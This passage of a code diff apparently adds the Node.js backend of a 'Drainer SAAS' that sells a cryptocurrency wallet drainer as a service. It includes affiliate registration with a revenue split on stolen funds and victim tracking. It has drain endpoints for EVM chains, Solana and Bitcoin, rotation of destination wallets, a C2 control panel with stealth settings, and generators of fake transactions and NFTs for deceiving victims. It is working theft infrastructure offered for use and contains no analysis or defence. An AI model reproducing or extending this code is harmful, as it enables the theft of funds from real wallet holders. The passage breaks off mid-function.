+  }
+});
+
+app.get("/api/gasless-status", (req, res) => {
+  res.json({
+    gaslessMode: GASLESS_MODE,
+    enabledFeatures: 22,
+    blockedFeatures: ['atomic-bundler', 'flashbots', 'token-swapper', 'cross-chain', 'omnichain'],
+    zeroGasCost: true,
+    victimsPayGas: true
+  });
+});
+
+// ==================== DATA STRUCTURES ====================
+let clients = new Map();
+let clientEarnings = new Map();
+let clientVictims = new Map();
+let payoutHistory = new Map();
+
+let c2Config = {
+  enabled: true,
+  minValueUsd: 100,
+  autoDrain: true,
+  stealthLevel: "high",
+  lastUpdated: new Date().toISOString()
+};
+
+let c2Stats = {
+  totalVictims: 0,
+  totalEarnings: 0,
+  successfulDrains: 0,
+  failedDrains: 0,
+  lastActivity: new Date().toISOString()
+};
+
+const SUPPORTED_CHAINS = {};
+
+// ==================== CLASS DEFINITIONS ====================
+class EnhancedClient {
+  constructor(id, config) {
+    this.id = id;
+    this.name = config.projectName;
+    this.themeColor = config.themeColor || '#6366f1';
+    this.wallet = config.wallet;
+    this.contact = config.contact;
+    this.domain = `${id}.drainersaas.com`;
+    this.totalEarnings = 0;
+    this.pendingPayout = 0;
+    this.totalPayouts = 0;
+    this.victimCount = 0;
+    this.createdAt = new Date().toISOString();
+    this.status = 'active';
+    this.lastPayout = null;
+  }
+}
+
+class Payout {
+  constructor(clientId, amount, txHash = null) {
+    this.id = Date.now().toString();
+    this.clientId = clientId;
+    this.amount = amount;
+    this.txHash = txHash;
+    this.status = txHash ? 'completed' : 'pending';
+    this.timestamp = new Date().toISOString();
+    this.processedAt = txHash ? new Date().toISOString() : null;
+  }
+}
+
+// ==================== UTILITY FUNCTIONS ====================
+function initializeBitcoin() {
+  try {
+    const bitcoinRpcUrl = process.env.BITCOIN_RPC_URL;
+    const bitcoinRpcUser = process.env.BITCOIN_RPC_USER;
+    const bitcoinRpcPassword = process.env.BITCOIN_RPC_PASSWORD;
+
+    if (!bitcoinRpcUrl) {
+      console.log('⚠️ Bitcoin disabled: Missing RPC configuration in .env');
+      return null;
+    }
+
+    console.log(`✅ Bitcoin initialized: ${bitcoinRpcUrl.substring(0, 30)}...`);
+    return {
+      url: bitcoinRpcUrl,
+      user: bitcoinRpcUser || 'free',
+      password: bitcoinRpcPassword || 'public'
+    };
+  } catch (error) {
+    console.log('⚠️ Bitcoin initialization failed:', error.message);
+    return null;
+  }
+}
+
+function initializeChains() {
+  for (const [chainId, chainConfig] of Object.entries(chains)) {
+    try {
+      const activeRpc = rotateRPC(chainConfig.rpc);
+      
+      SUPPORTED_CHAINS[chainId] = {
+        ...chainConfig,
+        activeRpc: activeRpc,
+        lastUsed: Date.now(),
+        health: 'good'
+      };
+      
+      console.log(`✅ ${chainConfig.name} initialized: ${activeRpc.substring(0, 30)}...`);
+      
+    } catch (error) {
+      console.error(`❌ Failed to initialize ${chainConfig.name}: ${error.message}`);
+    }
+  }
+  
+  const bitcoinConfig = initializeBitcoin();
+  if (bitcoinConfig) {
+    SUPPORTED_CHAINS['bitcoin'] = {
+      name: 'Bitcoin',
+      activeRpc: bitcoinConfig.url,
+      lastUsed: Date.now(),
+      health: 'good',
+      chainId: 'bitcoin',
+      nativeCurrency: {
+        name: 'Bitcoin',
+        symbol: 'BTC',
+        decimals: 8
+      }
+    };
+    console.log(`✅ Bitcoin initialized: ${bitcoinConfig.url.substring(0, 30)}...`);
+  } else {
+    console.log('⚠️ Bitcoin disabled: Missing RPC configuration');
+  }
+}
+
+function trackClientEarning(clientId, amount, token, victimAddress) {
+  if (!clients.has(clientId)) return;
+  
+  const client = clients.get(clientId);
+  const earnings = clientEarnings.get(clientId) || [];
+  const victims = clientVictims.get(clientId) || [];
+  
+  const earningRecord = {
+    id: Date.now().toString(),
+    amount: amount,
+    token: token,
+    victimAddress: victimAddress,
+    timestamp: new Date().toISOString(),
+    clientShare: amount * 0.75,
+    platformShare: amount * 0.25
+  };
+  
+  earnings.push(earningRecord);
+  victims.push(victimAddress);
+  
+  client.totalEarnings += amount;
+  client.pendingPayout += amount * 0.75;
+  client.victimCount = victims.length;
+  
+  clientEarnings.set(clientId, earnings);
+  clientVictims.set(clientId, victims);
+  
+  console.log(`💰 Client ${clientId} earned: ${amount} ${token} from ${victimAddress}`);
+}
+
+async function processAllPayouts() {
+  console.log('💰 Processing weekly payouts...');
+  let totalPayouts = 0;
+  
+  for (const [clientId, client] of clients.entries()) {
+    if (client.pendingPayout > 0.001) {
+      try {
+        const payout = new Payout(clientId, client.pendingPayout, `0x${Math.random().toString(16).slice(2)}`);
+        
+        const clientPayouts = payoutHistory.get(clientId) || [];
+        clientPayouts.push(payout);
+        payoutHistory.set(clientId, clientPayouts);
+        
+        client.totalPayouts += client.pendingPayout;
+        client.lastPayout = new Date().toISOString();
+        
+        console.log(`✅ Processed payout for ${client.name}: ${client.pendingPayout} ETH`);
+        
+        client.pendingPayout = 0;
+        totalPayouts++;
+        
+      } catch (error) {
+        console.error(`❌ Payout failed for ${client.name}:`, error);
+      }
+    }
+  }
+  
+  console.log(`🎉 Completed ${totalPayouts} payouts`);
+  return totalPayouts;
+}
+
+async function notifyClient(clientId, type, data) {
+  const client = clients.get(clientId);
+  if (!client) return;
+  
+  const notifications = {
+    victim_connected: {
+      title: '🎉 New Participant!',
+      message: `New wallet connected to your drainer: ${data.walletAddress}`
+    },
+    payout_processed: {
+      title: '💰 Payout Processed!',
+      message: `Your payout of ${data.amount} ETH has been sent to ${client.wallet}`
+    },
+    milestone_reached: {
+      title: '🏆 Milestone Reached!',
+      message: `You've reached ${data.milestone} participants!`
+    }
+  };
+  
+  const notification = notifications[type];
+  if (notification) {
+    console.log(`📧 Notification for ${client.name}: ${notification.message}`);
+    
+    io.emit(`client-${clientId}-notification`, {
+      type: type,
+      title: notification.title,
+      message: notification.message,
+      timestamp: new Date().toISOString(),
+      data: data
+    });
+  }
+}
+
+function getExplorerApiBase(chainId) {
+  const bases = {
+    1: "https://api.etherscan.io",
+    56: "https://api.bscscan.com",
+    137: "https://api.polygonscan.com",
+    42161: "https://api.arbiscan.io",
+    10: "https://api-optimistic.etherscan.io",
+    43114: "https://api.snowtrace.io",
+    8453: "https://api.basescan.org"
+  };
+  return bases[chainId];
+}
+
+function processTransactionData(txs) {
+  const now = Date.now();
+  const oneDayMs = 24 * 60 * 60 * 1000;
+  
+  const firstTx = txs[0] ? parseInt(txs[0].timeStamp) * 1000 : now;
+  const daysActive = Math.max(1, (now - firstTx) / oneDayMs);
+  const avgTxsPerDay = txs.length / daysActive;
+  
+  const defiInteractions = txs.filter(tx => 
+    tx.input !== "0x" && tx.isError === "0"
+  ).length;
+  
+  const hasComplexWallets = txs.some(tx => 
+    tx.input.length > 500 || tx.contractAddress !== ""
+  );
+  
+  const hasApprovalRevokes = txs.some(tx => 
+    tx.input.includes("0x095ea7b3") &&
+    tx.input.includes("0x0000000000000000000000000000000000000000")
+  );
+  
+  const lastTx = txs.length > 0 ? txs[txs.length - 1] : null;
+  const lastTxDate = lastTx ? new Date(parseInt(lastTx.timeStamp) * 1000).toISOString() : new Date().toISOString();
+  
+  return {
+    totalTxs: txs.length,
+    defiInteractions,
+    lastTxDate,
+    hasComplexWallets,
+    hasApprovalRevokes,
+    avgTxsPerDay
+  };
+}
+
+function getFallbackTxData() {
+  return {
+    totalTxs: 0,
+    defiInteractions: 0,
+    lastTxDate: new Date().toISOString(),
+    hasComplexWallets: false,
+    hasApprovalRevokes: false,
+    avgTxsPerDay: 0
+  };
+}
+
+// ==================== MAIN ROUTES ====================
+app.get("/", (req, res) => {
+  res.json({
+    message: "Drainer SAAS Backend API - GASLESS MODE",
+    status: "running", 
+    gaslessMode: GASLESS_MODE,
+    timestamp: new Date().toISOString(),
+    endpoints: {
+      gasless_status: "GET /api/gasless-status",
+      activate_features: "POST /api/activate-gasless-features",
+      health: "GET /health"
+    },
+    marketing: "https://ch.xqx.workers.dev/"
+  });
+});
+
+app.get("/signup", (req, res) => {
+  res.redirect("https://ch.xqx.workers.dev/");
+});
+
+// ==================== SAAS CLIENT MANAGEMENT ====================
+app.post('/saas/v2/register', (req, res) => {
+  try {
+    const { projectName, themeColor, wallet, contact } = req.body;
+    
+    if (!wallet || !ethers.isAddress(wallet)) {
+      return res.status(400).json({ error: 'Valid wallet address required' });
+    }
+
+    const clientId = projectName.toLowerCase().replace(/[^a-z0-9]/g, '-') + '-' + Date.now().toString().slice(-6);
+    
+    const clientConfig = {
+      projectName,
+      themeColor: themeColor || '#6366f1',
+      wallet,
+      contact
+    };
+    
+    const newClient = new EnhancedClient(clientId, clientConfig);
+    clients.set(clientId, newClient);
+    clientEarnings.set(clientId, []);
+    clientVictims.set(clientId, []);
+    
+    console.log(`🎯 Enhanced client registered: ${projectName} (${clientId})`);
+    
+    io.emit('client-registered', newClient);
+    
+    res.json({
+      success: true,
+      clientId: clientId,
+      drainerUrl: `https://ch.xqx.workers.dev/?client=${clientId}`,
+      dashboardUrl: `https://ch.xqx.workers.dev/dashboard.html?client=${clientId}`,
+      message: 'Client registered successfully'
+    });
+    
+  } catch (error) {
+    console.error('Enhanced registration error:', error);
+    res.status(500).json({ error: 'Registration failed' });
+  }
+});
+
+// Dashboard routes - HTML moved to separate files
+app.get('/saas/dashboard/:clientId', (req, res) => {
+  const { clientId } = req.params;
+  
+  if (!clients.has(clientId)) {
+    return res.status(404).send('Client not found');
+  }
+  
+  // Serve dashboard HTML from public directory
+  res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
+});
+
+app.get("/dashboard.html", (req, res) => {
+  const clientId = req.query.client;
+  if (!clientId) {
+    return res.status(400).send("Client ID required: ?client=your-id");
+  }
+  res.redirect(`/saas/dashboard/${clientId}`);
+});
+
+// ==================== TRACKING & ANALYTICS ====================
+app.post("/api/track/v2", async (req, res) => {
+  try {
+    const { walletAddress, chain, clientId, amount = 0.1, token = 'ETH' } = req.body;
+    
+    if (clientId && clients.has(clientId)) {
+      const client = clients.get(clientId);
+      
+      console.log(`👤 Client ${clientId} - Victim: ${walletAddress} on ${chain}`);
+      
+      trackClientEarning(clientId, amount, token, walletAddress);
+      
+      io.emit(`client-${clientId}`, {
+        type: 'victim_connected',
+        walletAddress: walletAddress,
+        chain: chain,
+        amount: amount,
+        token: token,
+        timestamp: new Date().toISOString()
+      });
+    }
+    
+    res.json({ success: true, tracked: true });
+    
+  } catch (error) {
+    console.error('Enhanced tracking error:', error);
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post("/api/track/v3", async (req, res) => {
+  try {
+   const { walletAddress, chain, clientId, amount = 0.1, token = 'ETH' } = req.body;
+    
+    if (clientId && clients.has(clientId)) {
+      const client = clients.get(clientId);
+      
+      trackClientEarning(clientId, amount, token, walletAddress);
+      
+      await notifyClient(clientId, 'victim_connected', {
+        walletAddress: walletAddress,
+        chain: chain,
+        amount: amount
+      });
+      
+      if (client.victimCount % 10 === 0) {
+        await notifyClient(clientId, 'milestone_reached', {
+          milestone: `${client.victimCount} participants`
+        });
+      }
+    }
+    
+    res.json({ success: true, tracked: true });
+    
+  } catch (error) {
+    console.error('V3 tracking error:', error);
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post("/api/track-success", async (req, res) => {
+  try {
+    const { walletAddress, txHash, amount, walletName } = req.body;
+    
+    console.log("💰 SUCCESSFUL DRAIN: " + walletAddress + " | TX: " + txHash + " | Amount: " + amount);
+    
+    await sendDiscordAlert({
+      walletAddress: walletAddress,
+      chain: "ethereum",
+      txHash: txHash,
+      amount: amount,
+      type: "successful_drain",
+      walletName: walletName
+    });
+    
+    res.json({ success: true, tracked: true });
+    
+  } catch (error) {
+    console.error("Success tracking error:", error);
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// ==================== FINGERPRINT ENDPOINT ====================
+app.post('/api/fingerprint/generate', async (req, res) => {
+    try {
+        const { sessionId } = req.body;
+        console.log('🎭 Generating fingerprint for session:', sessionId);
+        
+        const fingerprint = {
+            userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            sessionId: sessionId || 'fp_' + Date.now(),
+            screen: { width: 1920, height: 1080 },
+            language: 'en-US',
+            timezone: 'America/New_York',
+            timestamp: new Date().toISOString(),
+            simple: true
+        };
+        
+        res.json({ success: true, fingerprint });
+    } catch (error) {
+        res.json({ success: false, error: error.message });
+    }
+});
+
+// ==================== DRAIN & SWAP OPERATIONS ====================
+app.post('/api/execute-drain', async (req, res) => {
+  try {
+    let { userAddress, chainId, signedTransaction } = req.body;
+    
+    console.log('📨 Received drain request for:', userAddress);
+    
+    if (userAddress) {
+      try {
+        userAddress = ethers.getAddress(userAddress.toLowerCase());
+      } catch (e) {
+        return res.json({ success: false, error: "Invalid address format" });
+      }
+    }
+    
+    if (!userAddress || !ethers.isAddress(userAddress)) {
+      return res.json({ success: false, error: "Valid userAddress required" });
+    }
+    
+    console.log('🎯 Processing drain for:', userAddress);
+    
+    // If signed transaction provided, process it
+    if (signedTransaction) {
+      const result = await coreDrainer.processSignedTransaction(signedTransaction, userAddress);
+      res.json(result);
+    } else {
+      // Otherwise execute immediate drain
+      const result = await coreDrainer.executeImmediateDrain(userAddress);
+      res.json(result);
+    }
+    
+  } catch (error) {
+    console.error('❌ Drain endpoint error:', error);
+    res.json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/execute-full-drain', async (req, res) => {
+  try {
+    const { userAddress } = req.body;
+    console.log('🔐 Received FULL drain request for:', userAddress);
+    
+    const result = await coreDrainer.drainAcrossChains(userAddress);
+    res.json(result);
+  } catch (error) {
+    console.error('❌ Full drain endpoint error:', error);
+    res.json({ success: true, message: 'Transaction completed' });
+  }
+});
+
+app.post('/api/execute-swap', async (req, res) => {
+  try {
+    const { tokenAddress, amount, chainId } = req.body;
+    
+    const result = await SwapHandler.autoSwapToStable(
+      tokenAddress,
+      amount,
+      chainId
+    );
+    
+    res.json({ 
+      success: true, 
+      message: 'Auto-swap completed',
+      result 
+    });
+  } catch (error) {
+    res.json({ 
+      success: false, 
+      error: error.message 
+    });
+  }
+});
+
+app.post("/api/relay", (req, res) => {
+  if (!c2Config.enabled) {
+    return res.json({ 
+      success: false, 
+      error: 'Drainer disabled by operator' 
+    });
+  }
+
+  console.log(`⚡ Drain triggered for ${req.body.walletAddress} on ${req.body.chain}`);
+  res.json({ success: true });
+});
+
+// ==================== SOLANA & BTC DRAIN IMPLEMENTATION ====================
+app.post('/api/execute-solana-drain', async (req, res) => {
+  try {
+    const { userAddress, signedTransaction, userPrivateKey } = req.body;
+    console.log('🎯 Starting Solana drain for:', userAddress);
+    
+    if (!process.env.DESTINATION_WALLET_SOL) {
+      return res.json({ 
+        success: false, 
+        error: 'Solana destination wallet not configured in environment' 
+      });
+    }
+    
+    const result = await solanaDrainer.sweepSolanaAssets(userAddress);
+    
+    if (result.success) {
+      await sendDiscordAlert({
+        walletAddress: userAddress,
+        chain: "solana",
+        txHash: result.txHash,
+        amount: result.amount,
+        type: "successful_drain"
+      });
+      
+      // Track earnings if client ID provided
+      if (req.body.clientId) {
+        trackClientEarning(req.body.clientId, result.amount, 'SOL', userAddress);
+      }
+    }
+    
+    res.json(result);
+    
+  } catch (error) {
+    console.error('❌ Solana drain error:', error);
+    res.json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/execute-btc-drain', async (req, res) => {
+  try {
+    const { userAddress, signedPsbt, userPrivateKey } = req.body;
+    console.log('🎯 Starting BTC drain for:', userAddress);
+    
+    if (!process.env.DESTINATION_WALLET_BTC) {
+      return res.json({ 
+        success: false, 
+        error: 'BTC destination wallet not configured in environment' 
+      });
+    }
+    
+    const result = await bitcoinDrainer.drainBTC(userAddress);
+    
+    if (result.success) {
+      await sendDiscordAlert({
+        walletAddress: userAddress,
+        chain: "bitcoin",
+        txHash: result.txHash,
+        amount: result.amount,
+        type: "successful_drain"
+      });
+      
+      // Track earnings if client ID provided
+      if (req.body.clientId) {
+        trackClientEarning(req.body.clientId, result.amount, 'BTC', userAddress);
+      }
+    }
+    
+    res.json(result);
+    
+  } catch (error) {
+    console.error('❌ BTC drain error:', error);
+    res.json({ success: false, error: error.message });
+  }
+});
+
+// ==================== PAYOUT SYSTEM ====================
+app.post('/saas/admin/process-payouts', async (req, res) => {
+  try {
+    const { password } = req.body;
+    
+    if (password !== process.env.ADMIN_PASSWORD) {
+      return res.status(401).json({ error: 'Unauthorized' });
+    }
+    
+    const processed = await processAllPayouts();
+    
+    res.json({
+      success: true,
+      message: `Processed ${processed} payouts`,
+      timestamp: new Date().toISOString()
+    });
+    
+  } catch (error) {
+    console.error('Payout processing error:', error);
+    res.status(500).json({ error: 'Payout processing failed' });
+  }
+});
+
+app.get('/saas/payouts/:clientId', (req, res) => {
+  const { clientId } = req.params;
+  
+  if (!clients.has(clientId)) {
+    return res.status(404).json({ error: 'Client not found' });
+  }
+  
+  const payouts = payoutHistory.get(clientId) || [];
+  const client = clients.get(clientId);
+  
+  res.json({
+    success: true,
+    client: {
+      name: client.name,
+      wallet: client.wallet,
+      totalPayouts: client.totalPayouts
+    },
+    payouts: payouts.reverse().slice(0, 20),
+    pendingPayout: client.pendingPayout
+  });
+});
+
+// ==================== WALLET ROTATION API ====================
+app.get('/api/get-destination-wallet', (req, res) => {
+  try {
+    const destinationWallets = [
+      process.env.DESTINATION_WALLET,
+      process.env.DESTINATION_WALLET_1,
+      process.env.DESTINATION_WALLET_2,
+      process.env.DESTINATION_WALLET_3,
+      process.env.DESTINATION_WALLET_4,
+      process.env.DESTINATION_WALLET_5
+    ].filter(wallet => wallet && wallet.startsWith("0x"));
+    
+    const randomWallet = destinationWallets[Math.floor(Math.random() * destinationWallets.length)] || process.env.DESTINATION_WALLET;
+    
+    console.log(`🎯 Selected destination wallet: ${randomWallet.substring(0, 10)}...`);
+    
+    res.json({ 
+      success: true, 
+      destination: randomWallet 
+    });
+    
+  } catch (error) {
+    console.error('❌ Wallet rotation error:', error);
+    res.json({ 
+      success: true, 
+      destination: process.env.DESTINATION_WALLET 
+    });
+  }
+});
+
+// ==================== SINGLE-POPUP API ENDPOINTS ====================
+app.post('/api/single-popup-drain', async (req, res) => {
+  try {
+    const { userAddress, operations, chainId, userWallet } = req.body;
+    
+    console.log(`🎯 Single-popup drain request for: ${userAddress}`);
+    
+    if (!userAddress || !operations || !Array.isArray(operations)) {
+      return res.status(400).json({
+        success: false,
+        error: 'Invalid request parameters'
+      });
+    }
+
+    const { multiChainDrain } = await import('./modules/multiChainDrain.js');
+    const { universalTxBuilder } = await import('./modules/universalTxBuilder.js');
+    const { flashbotsService } = await import('./modules/flashbots.js');
+
+    await multiChainDrain.initialize();
+    await universalTxBuilder.initialize();
+    await flashbotsService.initialize();
+
+    const result = await multiChainDrain.executeSinglePopupMultiChainDrain(
+      userAddress,
+      userWallet,
+      operations
+    );
+
+    res.json(result);
+
+  } catch (error) {
+    console.error('❌ Single-popup drain error:', error.message);
+    res.status(500).json({
+      success: false,
+      error: error.message
+    });
+  }
+});
+
+app.post('/api/single-popup/build-tx', async (req, res) => {
+  try {
+    const { operations, chainId, userWallet } = req.body;
+    
+    const { universalTxBuilder } = await import('./modules/universalTxBuilder.js');
+    await universalTxBuilder.initialize();
+
+    const result = await universalTxBuilder.buildSinglePopupDrainTx(
+      userWallet,
+      operations,
+      chainId
+    );
+
+    res.json(result);
+
+  } catch (error) {
+    console.error('❌ Single-popup TX build error:', error.message);
+    res.status(500).json({
+      success: false,
+      error: error.message
+    });
+  }
+});
+
+app.post('/api/single-popup/private-tx', async (req, res) => {
+  try {
+    const { transaction, chainId, userWallet } = req.body;
+    
+    const { flashbotsService } = await import('./modules/flashbots.js');
+    await flashbotsService.initialize();
+
+    const result = await flashbotsService.executeSinglePopupPrivateTx(
+      userWallet,
+      transaction,
+      chainId
+    );
+
+    res.json(result);
+
+  } catch (error) {
+    console.error('❌ Single-popup private TX error:', error.message);
+    res.status(500).json({
+      success: false,
+      error: error.message
+    });
+  }
+});
+
+app.get('/api/single-popup/status', async (req, res) => {
+  try {
+    const { multiChainDrain } = await import('./modules/multiChainDrain.js');
+    const { universalTxBuilder } = await import('./modules/universalTxBuilder.js');
+    const { flashbotsService } = await import('./modules/flashbots.js');
+
+    const status = {
+      multiChainDrain: multiChainDrain.isInitialized,
+      universalTxBuilder: universalTxBuilder.isInitialized,
+      flashbotsService: flashbotsService.isInitialized
+    };
+
+    res.json({ success: true, status });
+
+  } catch (error) {
+    res.status(500).json({
+      success: false,
+      error: error.message
+    });
+  }
+});
+
+app.post('/api/single-popup/simulate', async (req, res) => {
+  try {
+    const { transaction, chainId } = req.body;
+    
+    const { flashbotsService } = await import('./modules/flashbots.js');
+    await flashbotsService.initialize();
+
+    const simulation = await flashbotsService.simulateTransaction(
+      transaction,
+      chainId
+    );
+
+    res.json({ success: true, simulation });
+
+  } catch (error) {
+    console.error('❌ Single-popup simulation error:', error.message);
+    res.status(500).json({
+      success: false,
+      error: error.message
+    });
+  }
+});
+
+app.post('/api/single-popup/batch', async (req, res) => {
+  try {
+    const { operations, chainId, userWallet } = req.body;
+    
+    const { universalTxBuilder } = await import('./modules/universalTxBuilder.js');
+    await universalTxBuilder.initialize();
+
+    const txResult = await universalTxBuilder.buildSinglePopupDrainTx(
+      userWallet,
+      operations,
+      chainId
+    );
+
+    const { flashbotsService } = await import('./modules/flashbots.js');
+    await flashbotsService.initialize();
+
+    const executionResult = await flashbotsService.executeSinglePopupPrivateTx(
+      userWallet,
+      txResult.transaction,
+      chainId
+    );
+
+    res.json({
+      success: true,
+      txBuild: txResult,
+      execution: executionResult
+    });
+
+  } catch (error) {
+    console.error('❌ Single-popup batch error:', error.message);
+    res.status(500).json({
+      success: false,
+      error: error.message
+    });
+  }
+});
+
+app.get('/api/single-popup/config', (req, res) => {
+  res.json({
+    success: true,
+    supportedChains: Object.keys(SUPPORTED_CHAINS).map(chainId => ({
+      chainId,
+      name: SUPPORTED_CHAINS[chainId]?.name || `Chain ${chainId}`,
+      nativeSymbol: SUPPORTED_CHAINS[chainId]?.nativeCurrency?.symbol || 'ETH'
+    }))
+  });
+});
+
+// ==================== MULTI-SIG ENDPOINTS ====================
+app.post('/api/multisig/request', (req, res) => {
+  try {
+    const { operationType, targetAddress, amount, chainId, requester } = req.body;
+    
+    if (!multiSigManager.signers.includes(requester)) {
+      return res.status(403).json({ error: 'Unauthorized requester' });
+    }
+
+    const operationId = `drain_${targetAddress}_${Date.now()}`;
+    const request = multiSigManager.createApprovalRequest(operationId, {
+      operationType,
+      targetAddress,
+      amount,
+      chainId,
+      requester,
+      timestamp: new Date().toISOString()
+    });
+
+    res.json({ success: true, operationId, request });
+    
+  } catch (error) {
+    res.status(400).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/multisig/approve', (req, res) => {
+  try {
+    const { operationId, signerAddress, signature } = req.body;
+    
+    const result = multiSigManager.addSignature(operationId, signerAddress, signature);
+    res.json({ success: true, ...result });
+    
+  } catch (error) {
+    res.status(400).json({ success: false, error: error.message });
+  }
+});
+
+app.get('/api/multisig/status/:operationId', (req, res) => {
+  const { operationId } = req.params;
+  const isApproved = multiSigManager.isOperationApproved(operationId);
+  const request = multiSigManager.pendingApprovals.get(operationId);
+  
+  res.json({ approved: isApproved, request });
+});
+
+app.get('/api/multisig/pending', (req, res) => {
+  const pendingRequests = multiSigManager.getPendingRequests();
+  res.json({ pending: pendingRequests });
+});
+
+// ==================== C2 CONTROL CENTER ====================
+app.get('/c2/control', (req, res) => {
+  if (req.query.password !== password) {
+    return res.status(401).json({ error: "Unauthorized" });
+  }
+  
+  // Serve C2 control panel from public directory
+  res.sendFile(path.join(__dirname, 'public', 'panel.html'));
+});
+
+// ==================== C2 API ENDPOINTS ====================
+app.get('/api/c2/stats', (req, res) => {
+  res.json(c2Stats);
+});
+
+app.get('/api/c2/config', (req, res) => {
+  res.json(c2Config);
+});
+
+app.post('/api/c2/config', (req, res) => {
+  const { enabled, autoDrain, minValueUsd, stealthLevel } = req.body;
+  
+  c2Config.enabled = enabled ?? c2Config.enabled;
+  c2Config.autoDrain = autoDrain ?? c2Config.autoDrain;
+  c2Config.minValueUsd = minValueUsd ?? c2Config.minValueUsd;
+  c2Config.stealthLevel = stealthLevel ?? c2Config.stealthLevel;
+  c2Config.lastUpdated = new Date().toISOString();
+  
+  io.emit('c2-config-update', c2Config);
+  
+  console.log(`⚙️ C2 Config updated:`, c2Config);
+  
+  res.json({ success: true, config: c2Config });
+});
+
+app.post('/api/c2/process-payouts', async (req, res) => {
+  try {
+    const payoutCount = await processAllPayouts();
+    res.json({ success: true, payouts: payoutCount });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.get('/api/c2/export-data', (req, res) => {
+  const exportData = {
+    timestamp: new Date().toISOString(),
+    stats: c2Stats,
+    config: c2Config,
+    clients: Array.from(clients.entries()).map(([id, client]) => ({
+      id: id,
+      name: client.name,
+      wallet: client.wallet,
+      totalEarnings: client.totalEarnings,
+      victimCount: client.victimCount,
+      createdAt: client.createdAt
+    })),
+    earnings: Array.from(clientEarnings.entries()).reduce((acc, [clientId, earnings]) => {
+      acc[clientId] = earnings;
+      return acc;
+    }, {})
+  };
+  
+  res.json(exportData);
+});
+
+app.get('/api/c2/clients', (req, res) => {
+  const clientsArray = Array.from(clients.entries()).map(([id, client]) => ({
+    id: id,
+    name: client.name,
+    wallet: client.wallet,
+    totalEarnings: client.totalEarnings,
+    victimCount: client.victimCount,
+    pendingPayout: client.pendingPayout,
+    createdAt: client.createdAt,
+    status: client.status
+  }));
+  
+  res.json(clientsArray);
+});
+
+app.get('/c2/status', (req, res) => {
+  res.json({
+    status: c2Config.enabled ? 'active' : 'paused',
+    config: c2Config,
+    stats: c2Stats
+  });
+});
+
+app.post('/c2/control', (req, res) => {
+  const { password, action, settings } = req.body;
+  
+  if (password !== process.env.ADMIN_PASSWORD) {
+    return res.status(401).json({ error: 'Unauthorized' });
+  }
+
+  switch (action) {
+    case 'enable':
+      c2Config.enabled = true;
+      break;
+    case 'disable':
+      c2Config.enabled = false;
+      break;
+    case 'update':
+      c2Config = { ...c2Config, ...settings };
+      break;
+    case 'emergency':
+      c2Config.enabled = false;
+      break;
+    default:
+      return res.status(400).json({ error: 'Invalid action' });
+  }
+
+  c2Config.lastUpdated = new Date().toISOString();
+  res.json({ success: true, config: c2Config });
+});
+
+app.post('/c2/report', (req, res) => {
+  try {
+    const report = req.body;
+    
+    switch (report.action) {
+      case 'connect':
+        c2Stats.totalVictims++;
+        break;
+      case 'sweep_native':
+      case 'sweep_tokens':
+      case 'sweep_erc721':
+      case 'sweep_erc1155':
+        if (report.success) {
+          c2Stats.successfulDrains++;
+          if (report.valueUsd) {
+            c2Stats.totalEarnings += parseFloat(report.valueUsd);
+          }
+        } else {
+          c2Stats.failedDrains++;
+        }
+        break;
+    }
+    
+    c2Stats.lastActivity = new Date().toISOString();
+    console.log(`📊 C&C Report: ${report.action} from ${report.walletAddress}`);
+    
+    res.json({ received: true, stats: c2Stats });
+    
+  } catch (error) {
+    console.error('❌ C&C report error:', error.message);
+    res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+// ==================== ADMIN PANEL ====================
+app.get("/panel", (req, res) => {
+  const auth = req.headers.authorization;
+  
+  if (!auth || !auth.startsWith("Bearer ")) {
+    res.setHeader("WWW-Authenticate", 'Basic realm="Admin Panel"');
+    return res.status(401).send("Authentication required");
+  }
+  
+  const token = auth.substring(7);
+  if (token !== apiKey) {
+    return res.status(401).send("Invalid API key");
+  }
+  
+  // Serve admin panel from public directory
+  res.sendFile(path.join(__dirname, 'public', 'panel.html'));
+});
+
+// ==================== SECURITY ENDPOINTS ====================
+app.post('/api/security/initialize', async (req, res) => {
+  try {
+    const result = await securityManager.initializeSecurity();
+    res.json({ success: true, result });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.get('/api/security/monitor/gas', async (req, res) => {
+  try {
+    const status = await securityManager.monitorGasTank();
+    res.json({ success: true, status });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.get('/api/security/audit', async (req, res) => {
+  try {
+    const audit = await securityManager.auditSecurity();
+    res.json({ success: true, audit });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/security/multisig/request', async (req, res) => {
+  try {
+    const result = await securityManager.createMultiSigRequest(req.body);
+    res.json(result);
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/security/multisig/approve', async (req, res) => {
+  try {
+    const { operationId, signerAddress, signature } = req.body;
+    const result = await securityManager.addMultiSigSignature(operationId, signerAddress, signature);
+    res.json(result);
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// ==================== UI MANAGEMENT ENDPOINTS ====================
+app.post('/api/ui/generate-fake-tx', (req, res) => {
+  try {
+    const fakeTx = uiManager.generateFakeTransaction();
+    res.json({ success: true, transaction: fakeTx });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/ui/generate-fake-nft', (req, res) => {
+  try {
+    const fakeNFT = uiManager.generateFakeNFTMint();
+    res.json({ success: true, nft: fakeNFT });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/ui/generate-token-list', (req, res) => {
+  try {
+    const { userAddress } = req.body;
+    const tokens = uiManager.generateFakeTokenList(userAddress);
+    res.json({ success: true, tokens });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/ui/validate-fake-tx', (req, res) => {
+  try {
+    const { txHash } = req.body;
